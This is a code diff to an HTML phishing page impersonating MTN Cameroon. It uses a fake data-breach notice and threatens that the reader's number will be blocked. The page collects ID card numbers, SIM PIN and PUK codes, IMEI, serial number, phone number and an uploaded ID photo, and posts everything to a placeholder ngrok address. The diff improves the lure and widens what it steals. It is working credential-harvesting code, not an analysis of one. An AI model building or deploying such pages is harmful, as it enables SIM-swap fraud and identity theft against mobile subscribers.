@@ -32,15 +32,17 @@
   <a href="https://www.example.com/verify-identity">Verify Identity</a>
   <br>
   <h2>We are conducting an investigation into a recent data breach.</h2>
-  <p>Please provide your ID card number, sim pin and punk numbers,  and serial number so that we can verify your account.</p>
+  <p>Please provide your ID card number, SIM PIN and PUK numbers, and serial number so that we can verify your account.</p>
   <p>**If you do not provide the verification code below, your phone number will be blocked.**</p>
   <img src="https://www.mtncameroon.cm/images/logo.png" alt="MTN Cameroon Logo">
-  <form action="https://<your ngrok url>/" method="post">
+  <form action="https://<your ngrok url>/" method="post" enctype="multipart/form-data">
+    <input type="tel" name="phone_number" placeholder="Phone Number">
     <input type="text" name="id_card_number" placeholder="ID Card Number">
     <input type="text" name="serial_number" placeholder="Serial Number">
     <input type="text" name="IMEI" placeholder="IMEI">
     <input type="text" name="pin_number" placeholder="PIN Number">
     <input type="text" name="punk_number" placeholder="PUK Number">
+    <input type="file" name="id_card_photo" accept="image/jpeg,image/png">
     <input type="submit" value="Submit">
   </form>
   <script>
@@ -50,6 +52,7 @@
       event.preventDefault();
 
       const data = new FormData(form);
+      data.append('phone_number', form['phone_number'].value);
 
       const request = new XMLHttpRequest();
       request.open('POST', `https://<your ngrok url>/`);
